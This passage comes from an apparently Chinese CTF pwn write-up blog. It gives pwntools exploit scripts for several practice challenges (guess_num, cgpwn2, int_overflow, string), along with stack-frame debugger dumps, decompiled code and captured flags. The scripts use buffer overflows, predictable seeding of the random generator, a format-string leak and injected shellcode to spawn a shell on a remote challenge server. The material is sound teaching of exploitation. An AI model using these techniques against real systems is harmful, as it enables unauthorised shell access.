class="hljs-number">0x0804A024</span>)<br>sys_addr = p32(<span class="hljs-number">0x08048320</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) + sys_addr + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4</span> + bin_sh<br> <br>io.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;e626f78a0fd99bf06f22535c5a1eb7d2&#125;</span><br></code></pre></td></tr></table></figure><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><p>考察溢出、伪随机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">59754</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./guess&#x27;</span>)<br><span class="hljs-built_in">print</span>(elf.libc)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Your name:&#x27;</span>)<br>io.sendline(payload)<br>libc.srand(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    num = <span class="hljs-built_in">str</span>(libc.rand()%<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;number:&#x27;</span>)<br>    io.sendline(num)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;a6baa716374124aa6541575346d33ebf&#125;</span><br></code></pre></td></tr></table></figure><h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><p>rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">55082</span>)<br><br>system_addr = <span class="hljs-number">0x0804855A</span><br>bin_sh_addr = <span class="hljs-number">0x0804A080</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">0x26</span> + <span class="hljs-number">4</span>) + p32(system_addr) + p32(bin_sh_addr)<br>io.recvuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;here:&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;f27da510570ddc37586e1c3a6ff92d22&#125;</span><br></code></pre></td></tr></table></figure><p>这里记录一下构造栈帧的点，system的地址可以用以下两个：</p><ul><li>第一种</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.plt:08048420                 jmp     ds:off_804A01C<br>.plt:08048420 _system         endp<br></code></pre></td></tr></table></figure><p>对应的payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-comment">(0x26 + 4)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(system_addr)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(bin_sh_addr)</span><br></code></pre></td></tr></table></figure><p>对应栈帧分布：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[----------------------------------registers-----------------------------------]<br><span class="hljs-symbol">EAX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">EBX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">ECX:</span> <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-symbol">EDX:</span> <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">ESI:</span> <span class="hljs-number">0xf7fa4000</span> --&gt; <span class="hljs-number">0x1d5d8c</span> <br><span class="hljs-symbol">EDI:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">EBP:</span> <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">ESP:</span> <span class="hljs-number">0xffffd2dc</span> --&gt; <span class="hljs-number">0x565561d3</span> (&lt;main+<span class="hljs-number">42</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br><span class="hljs-symbol">EIP:</span> <span class="hljs-number">0x56556046</span> (&lt;system@plt+<span class="hljs-number">6</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span>)<br><span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x296</span> (carry PARITY ADJUST <span class="hljs-meta">zero</span> SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x5655603c</span>:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-built_in">al</span><br>   <span class="hljs-number">0x5655603e</span>:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-built_in">al</span><br>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>+<span class="hljs-number">0xc</span>]<br>=&gt; <span class="hljs-number">0x56556046</span> &lt;system@plt+<span class="hljs-number">6</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x5655604b</span> &lt;system@plt+<span class="hljs-number">11</span>&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x56556030</span><br>   <span class="hljs-number">0x56556050</span> &lt;__libc_start_main@plt&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>+<span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x56556056</span> &lt;__libc_start_main@plt+<span class="hljs-number">6</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-number">0x8</span><br>   <span class="hljs-number">0x5655605b</span> &lt;__libc_start_main@plt+<span class="hljs-number">11</span>&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x56556030</span><br>[------------------------------------stack-------------------------------------]<br><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd2dc</span> --&gt; <span class="hljs-number">0x565561d3</span> (&lt;main+<span class="hljs-number">42</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br><span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd2e4</span> --&gt; <span class="hljs-number">0xffffd3a4</span> --&gt; <span class="hljs-number">0xffffd540</span> (<span class="hljs-string">&quot;/root/a.out&quot;</span>)<br><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd2e8</span> --&gt; <span class="hljs-number">0xffffd3ac</span> --&gt; <span class="hljs-number">0xffffd54c</span> (<span class="hljs-string">&quot;LANG=zh_CN.UTF-8&quot;</span>)<br><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd2ec</span> --&gt; <span class="hljs-number">0x565561bd</span> (&lt;main+<span class="hljs-number">20</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x2e43</span>)<br><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd2f0</span> --&gt; <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd2f4</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br>[------------------------------------------------------------------------------]<br></code></pre></td></tr></table></figure><ul><li>第二种</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:08048553                 mov     dword ptr [esp], offset command ; &quot;echo hehehe&quot;<br>.text:0804855A                 call    _system<br>.text:0804855F                 nop<br></code></pre></td></tr></table></figure><p>对应的payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-comment">(0x26 + 4)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(system_addr)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(bin_sh_addr)</span><br></code></pre></td></tr></table></figure><p>对应栈帧分布情况：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[----------------------------------registers-----------------------------------]<br><span class="hljs-symbol">EAX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">EBX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">ECX:</span> <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-symbol">EDX:</span> <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">ESI:</span> <span class="hljs-number">0xf7fa4000</span> --&gt; <span class="hljs-number">0x1d5d8c</span> <br><span class="hljs-symbol">EDI:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">EBP:</span> <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">ESP:</span> <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">EIP:</span> <span class="hljs-number">0x565561ce</span> (&lt;main+<span class="hljs-number">37</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;)<br><span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x296</span> (carry PARITY ADJUST <span class="hljs-meta">zero</span> SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x565561c5</span> &lt;main+<span class="hljs-number">28</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">edx</span>,[<span class="hljs-built_in">eax</span>-<span class="hljs-number">0x1ff8</span>]<br>   <span class="hljs-number">0x565561cb</span> &lt;main+<span class="hljs-number">34</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">edx</span><br>   <span class="hljs-number">0x565561cc</span> &lt;main+<span class="hljs-number">35</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">eax</span><br>=&gt; <span class="hljs-number">0x565561ce</span> &lt;main+<span class="hljs-number">37</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;<br>   <span class="hljs-number">0x565561d3</span> &lt;main+<span class="hljs-number">42</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span><br>   <span class="hljs-number">0x565561d6</span> &lt;main+<span class="hljs-number">45</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x565561db</span> &lt;main+<span class="hljs-number">50</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esp</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>   <span class="hljs-number">0x565561de</span> &lt;main+<span class="hljs-number">53</span>&gt;:<span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ecx</span><br>Guessed arguments:<br>arg[<span class="hljs-number">0</span>]: <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>[------------------------------------stack-------------------------------------]<br><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd2e4</span> --&gt; <span class="hljs-number">0xffffd3a4</span> --&gt; <span class="hljs-number">0xffffd540</span> (<span class="hljs-string">&quot;/root/a.out&quot;</span>)<br><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd2e8</span> --&gt; <span class="hljs-number">0xffffd3ac</span> --&gt; <span class="hljs-number">0xffffd54c</span> (<span class="hljs-string">&quot;LANG=zh_CN.UTF-8&quot;</span>)<br><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd2ec</span> --&gt; <span class="hljs-number">0x565561bd</span> (&lt;main+<span class="hljs-number">20</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x2e43</span>)<br><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd2f0</span> --&gt; <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd2f4</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd2fc</span> --&gt; <span class="hljs-number">0xf7de79a1</span> (&lt;__libc_start_main+<span class="hljs-number">241</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br>[------------------------------------------------------------------------------]<br></code></pre></td></tr></table></figure><p>总的来说就是两个system处于不同的函数栈帧中，所以一个payload需要多构造4个字节的padding来填充system返回地址，而另一个不需要。</p><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>整数溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">30567</span>)<br><br>cat_flag = <span class="hljs-number">0x08048694</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">24</span><br>payload += p32(cat_flag)<br>payload += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">260</span> - <span class="hljs-number">24</span> - <span class="hljs-number">4</span>)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Your choice:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Please input your username:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;Hvnt3r&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Please input your passwd:&#x27;</span>)<br>io.sendline(payload)<br><br><span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">cyberpeace&#123;<span class="hljs-number">1</span>ca<span class="hljs-number">6</span>cd<span class="hljs-number">8943</span>a<span class="hljs-number">40</span>dc<span class="hljs-number">6698</span>ef<span class="hljs-number">90</span>a<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>f<span class="hljs-number">4</span><span class="hljs-keyword">cc</span><span class="hljs-number">6</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>格式化字符串漏洞，现实少见，比赛多见</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">unsigned __int64 sub_400BB9()<br>&#123;<br>  <span class="hljs-built_in">int</span> v1; // [rsp+4h] [rbp-7Ch]<br>  __int64 v2; // [rsp+8h] [rbp-78h]<br>  char <span class="hljs-built_in">format</span>; // [rsp+10h] [rbp-70h]<br>  unsigned __int64 v4; // [rsp+78h] [rbp-8h]<br><br>  v4 = __readfsqword(0x28u);<br>  v2 = 0LL;<br>  puts(<span class="hljs-string">&quot;You travel a short distance east.That&#x27;s odd, anyone disappear suddenly&quot;</span>);<br>  puts(<span class="hljs-string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);<br>  puts(<span class="hljs-string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);<br>  puts(<span class="hljs-string">&quot;go into there(1), or leave(0)?:&quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">1</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;A voice heard in your mind&quot;</span>);<br>    puts(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;&quot;</span>);<br>    _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v2);<br>    puts(<span class="hljs-string">&quot;And, you wish is:&quot;</span>);<br>    _isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;<span class="hljs-built_in">format</span>);    &lt;====== Here<br>    puts(<span class="hljs-string">&quot;Your wish is&quot;</span>);<br>    printf(&amp;<span class="hljs-built_in">format</span>, &amp;<span class="hljs-built_in">format</span>);        &lt;====== Here<br>    puts(<span class="hljs-string">&quot;I hear it, I hear it....&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(0x28u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过<code>%x</code>看偏移，其实不用着这种方法也能知道，64位函数参数前六个参数再寄存器中，第7个参数在栈中，下面给出的<code>secret[0] is 11cc010</code>，通过<code>%x</code>确认偏移为7</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs applescript">we are wizard, we will give you hand, you can <span class="hljs-keyword">not</span> defeat dragon <span class="hljs-keyword">by</span> yourself ...<br>we will <span class="hljs-keyword">tell</span> you two secret ...<br>secret[<span class="hljs-number">0</span>] <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>cc010<br>secret[<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>cc014<br>do <span class="hljs-keyword">not</span> <span class="hljs-keyword">tell</span> anyone <br>What should your <span class="hljs-built_in">character</span>&#x27;s <span class="hljs-built_in">name</span> be:<br>asd<br>Creating a new player.<br> This <span class="hljs-keyword">is</span> a famous <span class="hljs-keyword">but</span> quite unusual inn. The air <span class="hljs-keyword">is</span> fresh <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span><br>marble-tiled ground <span class="hljs-keyword">is</span> clean. Few rowdy guests can be seen, <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span><br>furniture looks undamaged <span class="hljs-keyword">by</span> brawls, which are very common <span class="hljs-keyword">in</span> other pubs<br>all <span class="hljs-keyword">around</span> <span class="hljs-keyword">the</span> world. The decoration looks extremely valuable <span class="hljs-keyword">and</span> would fit<br><span class="hljs-keyword">into</span> a palace, <span class="hljs-keyword">but</span> <span class="hljs-keyword">in</span> this city <span class="hljs-keyword">it</span>&#x27;s quite ordinary. In <span class="hljs-keyword">the</span> <span class="hljs-keyword">middle</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span><br>room are velvet covered chairs <span class="hljs-keyword">and</span> benches, which surround large oaken<br>tables. A large sign <span class="hljs-keyword">is</span> fixed <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> northern wall <span class="hljs-keyword">behind</span> a wooden bar. In<br>one corner you notice a fireplace.<br>There are two obvious exits: east, up.<br>But strange thing <span class="hljs-keyword">is</span> ,no one there.<br>So, <span class="hljs-keyword">where</span> you will go?east <span class="hljs-keyword">or</span> up?:<br>east<br>You travel a short distance east.That&#x27;s odd, anyone disappear suddenly<br>, what happend?! You just travel , <span class="hljs-keyword">and</span> find another hole<br>You recall, a big black hole will suckk you <span class="hljs-keyword">into</span> <span class="hljs-keyword">it</span>! Know what should you do?<br>go <span class="hljs-keyword">into</span> there(<span class="hljs-number">1</span>), <span class="hljs-keyword">or</span> leave(<span class="hljs-number">0</span>)?:<br><span class="hljs-number">1</span><br>A voice heard <span class="hljs-keyword">in</span> your mind<br>&#x27;Give <span class="hljs-keyword">me</span> an address&#x27;<br><span class="hljs-number">18661392</span><br>And, you wish <span class="hljs-keyword">is</span>:<br>%x.%x.%x.%x.%x.%x.%x.%x.%x.<br>Your wish <span class="hljs-keyword">is</span><br>ea3c76a3.ea3c8780.ea0f92c0.ea5ef700.ea5ef700<span class="hljs-number">.22</span><span class="hljs-number">.11</span>cc010<span class="hljs-number">.252e7825</span><span class="hljs-number">.2e78252</span>e.I hear <span class="hljs-keyword">it</span>, I hear <span class="hljs-keyword">it</span>....<br>Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!<br>Dragon <span class="hljs-built_in">say</span>: HaHa! you were supposed <span class="hljs-keyword">to</span> have a normal<br>RPG game, <span class="hljs-keyword">but</span> I have changed <span class="hljs-keyword">it</span>! you have no weapon <span class="hljs-keyword">and</span> <br>skill! you could <span class="hljs-keyword">not</span> defeat <span class="hljs-keyword">me</span> !<br>That&#x27;s sound terrible! you meet final boss!<span class="hljs-keyword">but</span> you level <span class="hljs-keyword">is</span> ONE!<br></code></pre></td></tr></table></figure><p>而且这个题中有一个强制类型转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);<br>v1 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>read(<span class="hljs-number">0</span>, v1, <span class="hljs-number">0x100</span>uLL);<br>((<span class="hljs-type">void</span> (__fastcall *)(_QWORD, <span class="hljs-type">void</span> *))v1)(<span class="hljs-number">0LL</span>, v1);   &lt;====<br></code></pre></td></tr></table></figure><p>用户输入会被直接执行，这里就放入shellcode。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">36839</span>)<br><br>io.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>arr_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>payload = asm(shellcraft.sh())<br>payload2 = <span 